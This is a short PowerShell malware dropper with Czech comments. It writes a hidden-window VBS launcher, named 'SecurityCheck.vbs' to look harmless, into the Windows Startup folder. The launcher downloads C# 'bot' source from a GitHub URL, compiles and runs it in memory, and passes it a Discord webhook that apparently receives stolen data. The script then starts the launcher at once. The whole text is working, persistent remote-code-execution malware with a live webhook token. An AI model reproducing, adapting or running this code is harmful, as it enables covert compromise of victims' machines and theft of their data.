$webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcUuG5GBIt6B9f55h99touvLjLOxvyLijuaTuZT15NO-xzYrJ78S2d2o"
$github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.vbs"

# Příkaz, který ti právě fungoval (upravený pro VBS)
$innerCmd = "powershell -WindowStyle Hidden -Command `"`$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`" "

# Vytvoření VBS souboru
$vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$innerCmd`", 0, False"

[System.IO.File]::WriteAllText($startupPath, $vbsContent)

# Okamžité spuštění pro test
wscript.exe $startupPath
